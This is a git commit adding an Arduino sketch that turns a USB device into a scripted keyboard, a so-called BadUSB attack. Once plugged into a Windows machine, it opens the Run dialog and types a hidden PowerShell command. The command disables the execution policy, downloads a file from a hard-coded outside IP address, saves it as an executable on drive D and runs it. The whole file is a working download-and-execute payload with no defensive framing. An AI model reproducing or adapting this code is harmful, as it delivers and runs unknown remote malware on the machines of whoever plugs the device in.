2e72e5887560b1d9a0c043507ddecf5d123fae4f
Cgnay0518 <36817557+Cgnay0518@users.noreply.github.com>
2020-09-22 03:22:22 +0800

    Add files via upload

---
+++ _66666666666.ino
@@ -0,0 +1,21 @@
+void setup() {//初始化
+  Keyboard.begin();//开始键盘通讯
+  delay(5000);//延时
+  Keyboard.press(KEY_LEFT_GUI);//win键
+  delay(500);
+  Keyboard.press('r');//r键
+  delay(500);
+  Keyboard.release(KEY_LEFT_GUI);
+  Keyboard.release('r');
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+  delay(500);
+  Keyboard.println("POWERSHELL -NOP -W HIDDEN -C sET-eXECUTIONpOLICY UNRESTRICTED -FORCE;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('http://47.98.151.104/999.html', 'D:\\X.EXE');START D:\\X.EXE");
+  //Keyboard.println("(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('http://47.98.151.104/999.html', 'D:\\X.EXE');START D:\\X.EXE;EXIT");
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+  Keyboard.end();//结束键盘通讯
+}
+void loop()//循环
+{
+}
